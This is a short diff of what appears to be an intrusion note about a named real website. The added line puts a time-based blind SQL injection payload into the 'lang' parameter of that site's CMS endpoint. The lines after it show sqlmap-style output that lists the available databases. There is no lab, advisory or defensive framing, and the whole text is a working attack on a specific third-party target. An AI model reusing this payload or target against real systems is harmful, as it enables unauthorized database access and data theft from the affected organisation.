@@ -1,4 +1,4 @@
-VULN URL : https://saadet.org.tr/cms/ajax.site.php?lang=0
+VULN URL : https://saadet.org.tr/cms/ajax.site.php?lang=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&p=faqsearch
 
 available databases [2]:
 [*] information_schema
